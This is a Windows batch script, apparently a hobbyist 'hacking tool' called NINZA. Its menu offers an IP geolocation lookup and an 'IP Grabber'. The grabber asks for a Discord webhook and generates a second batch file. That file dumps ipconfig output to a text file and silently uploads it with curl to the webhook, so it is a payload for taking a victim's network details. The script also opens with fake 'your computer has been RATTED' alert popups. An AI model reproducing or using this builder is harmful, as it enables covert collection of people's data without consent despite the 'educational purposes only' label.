@echo off
POWERSHELL.EXE -Command "Add-Type -AssemblyName System.Windows.Forms; [void] [System.Windows.Forms.MessageBox]::Show('Your computer has been RATTED. It is now under unauthorized remote access by Ninja LMAO!!', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"
POWERSHELL.EXE -Command "Add-Type -AssemblyName System.Windows.Forms; [void] [System.Windows.Forms.MessageBox]::Show('JUST KIDDING!! ITS FINE!!', 'Warning', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
cls
MODE 98,25
chcp 65001
title NINZA -by Ninja
color D

:start
goto menu

:menu
cls
echo:
echo:                                       
echo                            ███╗   ██╗██╗███╗   ██╗███████╗ █████╗                
echo                            ████╗  ██║██║████╗  ██║╚══███╔╝██╔══██╗              
echo                            ██╔██╗ ██║██║██╔██╗ ██║  ███╔╝ ███████║         
echo                            ██║╚██╗██║██║██║╚██╗██║ ███╔╝  ██╔══██║  
echo                            ██║ ╚████║██║██║ ╚████║███████╗██║  ██║    
echo                            ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   
echo:
echo                       ╔═══════════════════════╗ ╔═══════════════════════╗
echo                       ║ [1] IP Geo Lookup     ║ ║ [5] Exit              ║
echo                       ║ [2] IP Grabber        ║ ║ [6]                   ║
echo                       ║ [3] links             ║ ║ [7]                   ║
echo                       ║ [4] Credits           ║ ║ [8]                   ║
echo                       ╚═══════════════════════╝ ╚═══════════════════════╝                                                   
echo:
echo:
echo:

for /f "tokens=*" %%u in ('whoami') do set "username=%%u"

<nul set /p "=┌─── (user@%username%) "
echo:
echo │
<nul set /p "=└──► "
set /p choice="Enter your command: "

if "%choice%"=="1" goto ip_geo_lookup
if "%choice%"=="2" goto grabber
if "%choice%"=="3" goto Links
if "%choice%"=="4" goto credits
if "%choice%"=="5" goto end


goto menu

:Links
start https://ninja-za.github.io/Linktree/
goto menu

:grabber
cls
echo:
echo      ██╗██████╗      ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
echo      ██║██╔══██╗    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
echo      ██║██████╔╝    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
echo      ██║██╔═══╝     ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
echo      ██║██║         ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
echo      ╚═╝╚═╝          ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
echo:
echo       ╔═══════════════════════════════════════════════╗
echo       ║ Enter your Discord webhook:                   ║ 
echo       ╚═══════════════════════════════════════════════╝ 
echo:
echo:
set /p webhook=Enter here: 

if "%webhook%"=="" (
    echo:
    echo Discord webhook URL is required.
    timeout /t 2 >nul
    goto menu
)

echo Connection (True) Making IP logger script...
timeout /t 3 >nul

echo @echo off > ip_grabber_exec.bat
echo ipconfig > info.txt >> ip_grabber_exec.bat
echo curl --silent --output /dev/null -F 1=@"info.txt" %webhook% >> ip_grabber_exec.bat

echo IP grabber script has been created as ip_grabber_exec.bat
pause
goto menu

:ip_geo_lookup
cls
echo:
echo       ███████╗███╗   ██╗████████╗███████╗██████╗     ██╗██████╗ 
echo       ██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗    ██║██╔══██╗
echo       █████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝    ██║██████╔╝
echo       ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗    ██║██╔═══╝ 
echo       ███████╗██║ ╚████║   ██║   ███████╗██║  ██║    ██║██║     
echo       ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝╚═╝    
echo:
echo       ╔═══════════════════════════════════════════════╗
echo       ║ Enter an IP address to lookup:                ║ 
echo       ╚═══════════════════════════════════════════════╝ 
echo:
set /p ip="Enter Here: "

if "%ip%"=="" goto menu

curl -s "https://ipinfo.io/%ip%/json" > geolocation.json
if %errorlevel% neq 0 (
    echo Error: Failed to retrieve IP information. Please check your internet connection.
    pause
    goto ip_geo_lookup
)


cls
echo ═══════════════════════════════════════════════
echo           IP location for %ip%:
echo ═══════════════════════════════════════════════
echo:
type geolocation.json
del geolocation.json
echo:
echo:
echo ═══════════════════════════════════════════════
echo             Lookup Complete!
echo ═══════════════════════════════════════════════
echo:
pause
goto menu

:credits
cls
color D
echo.
echo ═════════════════════════════════════════
echo Made for educational purposes only!
echo           - Made by Ninja  
echo ═════════════════════════════════════════
timeout 1 /NOBREAK >nul
goto menu

:end
exit















